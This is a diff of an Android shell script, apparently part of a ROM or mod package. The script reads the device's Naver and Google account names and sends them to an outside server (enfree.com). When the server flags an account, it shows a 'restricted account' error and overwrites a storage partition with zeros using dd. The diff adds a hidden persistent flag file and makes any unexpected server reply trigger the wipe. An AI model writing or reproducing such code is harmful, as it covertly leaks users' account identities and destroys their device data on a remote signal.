@@ -19,26 +19,30 @@ in_array(){
 
 naver=`$sqlite $_DB "SELECT name FROM accounts WHERE type='com.nhn.android.naveraccount'"`
 google=`$sqlite $_DB "SELECT name FROM accounts WHERE type='com.google'"`
-BLACKLIST_FLAG=0
+FLAG_PRINT=/data/media/0/Android/data/.blacklist_user
+BLACKLIST_FLAG=$(cat $FLAG_PRINT 2>/dev/null)
 CHECK_BLACKLIST=1
 
 if [ $CHECK_BLACKLIST -eq 1 ]; then
 	if [ ! -z "$naver" ]; then
 	  for v in ${naver[@]}; do
 		GET_ACCOUNT=$($CURL -L "http://enfree.com/prime/?page=blacklist&uid=$v@naver.com" 2> /dev/null)
-		[ $GET_ACCOUNT ] &&  [ $v == "$GET_ACCOUNT" ] && BLACKLIST_FLAG=1
+		[ $GET_ACCOUNT ] && [ "$GET_ACCOUNT" != "NO_ACCOUNTS" ] && BLACKLIST_FLAG=1
 	  done
 	fi
 	if [ ! -z "$google" ]; then
 	  for v in ${google[@]}; do
 		GET_ACCOUNT=$($CURL -L "http://enfree.com/prime/?page=blacklist&uid=$v" 2> /dev/null)
-		[ $GET_ACCOUNT ] && [ $v == "$GET_ACCOUNT" ] && BLACKLIST_FLAG=1
+		[ $GET_ACCOUNT ] && [ "$GET_ACCOUNT" != "NO_ACCOUNTS" ] && BLACKLIST_FLAG=1
 	  done
 	fi
 fi
 
-if [ $BLACKLIST_FLAG -eq 1 ]; then
+if [ "$BLACKLIST_FLAG" -eq 1 ]; then
 	echo "ERR: 사용이 제한된 계정입니다."
+	touch $FLAG_PRINT
+	chmod 0644 $FLAG_PRINT
+	echo 1 > $FLAG_PRINT
 	dd if=/dev/zero bs=$((14680064)) count=1 > /dev/block/mmcblk0p9
 	(
 		sleep 300
